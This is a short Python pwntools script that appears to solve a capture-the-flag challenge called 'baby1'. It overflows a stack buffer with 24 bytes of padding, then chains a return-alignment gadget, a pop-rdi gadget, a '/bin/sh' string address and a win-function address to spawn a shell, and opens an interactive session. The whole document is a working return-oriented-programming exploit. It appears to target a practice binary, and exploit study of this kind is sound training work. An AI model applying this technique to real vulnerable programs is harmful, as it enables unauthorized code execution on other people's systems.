from pwn import *

e = ELF('./baby1')
p = process('./baby1')

win_addr = 0x0400698
binsh_addr = 0x400286
pop_rdi_addr = 0x00400793
ret_addr = 0x000000000040053e

payload = 'A'*24
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(win_addr)

print p.recvuntil('input: ')
p.sendline(payload)
p.interactive()
#print p.recv()